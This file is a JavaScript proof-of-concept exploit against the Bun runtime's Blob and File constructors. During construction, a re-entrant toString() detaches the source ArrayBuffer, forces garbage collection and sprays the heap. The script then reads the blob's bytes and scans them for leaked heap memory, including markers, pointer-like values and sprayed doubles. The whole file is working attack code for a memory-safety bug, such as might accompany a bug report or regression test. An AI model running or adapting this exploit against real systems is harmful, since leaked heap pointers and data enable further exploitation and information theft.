const sprayMode = process.env.SPRAY || "array-refs";
const constructorMode = process.env.CONSTRUCTOR || "blob";
const size = Number(process.env.BUF_SIZE || 8192);
const sprayCount = Number(process.env.SPRAY_COUNT || 4096);
const slots = Number(process.env.SLOTS || 1024);
const retained = [];
const marker = Buffer.from(`BUN_BLOB_LEAK_${sprayMode.toUpperCase()}`);

function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}

function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}

function allocateByteCanaries() {
  const out = [];
  for (let i = 0; i < sprayCount; i++) {
    const view = new Uint8Array(new ArrayBuffer(size));
    view.fill(0x7a);
    view.set(marker.subarray(0, Math.min(marker.length, view.length)), 0);
    out.push(view);
  }
  return out;
}

function allocateArrayRefs() {
  const anchors = Array.from({ length: 64 }, (_, i) => ({ i, marker: `blob-anchor-${i}` }));
  const out = [];
  for (let i = 0; i < sprayCount; i++) {
    const arr = new Array(slots);
    for (let j = 0; j < slots; j++) arr[j] = anchors[(i + j) & 63];
    out.push(arr);
  }
  return out;
}

function allocateArrayDoubles() {
  const out = [];
  for (let i = 0; i < sprayCount; i++) {
    const arr = new Array(slots);
    for (let j = 0; j < slots; j++) arr[j] = 3000.5 + i + (j / 1024);
    out.push(arr);
  }
  return out;
}

function allocateSpray() {
  switch (sprayMode) {
    case "byte-canary":
      return allocateByteCanaries();
    case "array-refs":
      return allocateArrayRefs();
    case "array-doubles":
      return allocateArrayDoubles();
    default:
      throw new Error("SPRAY must be byte-canary, array-refs, or array-doubles");
  }
}

function readU64LE(buf, offset) {
  let value = 0n;
  for (let i = 7; i >= 0; i--) value = (value << 8n) | BigInt(buf[offset + i]);
  return value;
}

function isPointerLike(value) {
  if ((value & 0x7n) !== 0n) return false;
  if (value < 0x100000000n) return false;
  if (value > 0x00007ffffffffffen) return false;
  const hi = Number((value >> 40n) & 0xffn);
  return hi !== 0x41 && hi !== 0x7a;
}

function classify(output) {
  const markerOffset = output.indexOf(marker);
  let oldFill = 0;
  let zero = 0;
  for (const byte of output) {
    if (byte === 0x41) oldFill++;
    if (byte === 0) zero++;
  }

  const pointerSamples = [];
  const seen = new Set();
  for (let offset = 0; offset + 8 <= output.length; offset += 8) {
    const value = readU64LE(output, offset);
    if (!isPointerLike(value)) continue;
    const hex = `0x${value.toString(16).padStart(16, "0")}`;
    if (seen.has(hex)) continue;
    seen.add(hex);
    pointerSamples.push({ offset, value: hex });
    if (pointerSamples.length >= 16) break;
  }

  const doubleSamples = [];
  const view = new DataView(output.buffer, output.byteOffset, output.byteLength);
  for (let offset = 0; offset + 8 <= output.length; offset += 8) {
    const value = view.getFloat64(offset, true);
    if (!Number.isFinite(value)) continue;
    if (value < 1 || value > 10000) continue;
    if (Math.abs(value - Math.round(value)) < 0.000001) continue;
    doubleSamples.push({ offset, value: Number(value.toFixed(6)) });
    if (doubleSamples.length >= 16) break;
  }

  return {
    markerOffset,
    oldFillRatio: Number((oldFill / output.length).toFixed(4)),
    zeroRatio: Number((zero / output.length).toFixed(4)),
    pointerLikeCount: pointerSamples.length,
    pointerSamples,
    doubleSamples,
    prefix: [...output.subarray(0, 64)],
  };
}

const backing = new ArrayBuffer(size);
const source = new Uint8Array(backing);
source.fill(0x41);

const reenter = {
  toString() {
    detach(backing);
    gcNow();
    retained.push(...allocateSpray());
    gcNow();
    return "Z";
  },
};

const blob = constructorMode === "file"
  ? new File([source, reenter], "leak.bin")
  : new Blob([source, reenter]);
const bytes = new Uint8Array(await blob.arrayBuffer());
const leaked = bytes.subarray(0, size);
const stats = classify(leaked);

console.log(JSON.stringify({
  sprayMode,
  constructorMode,
  size,
  sprayCount,
  slots,
  blobSize: blob.size,
  ...stats,
}));

process.exitCode = stats.markerOffset !== -1 || stats.pointerLikeCount > 0 || stats.doubleSamples.length > 0 || stats.oldFillRatio < 0.95 ? 86 : 0;
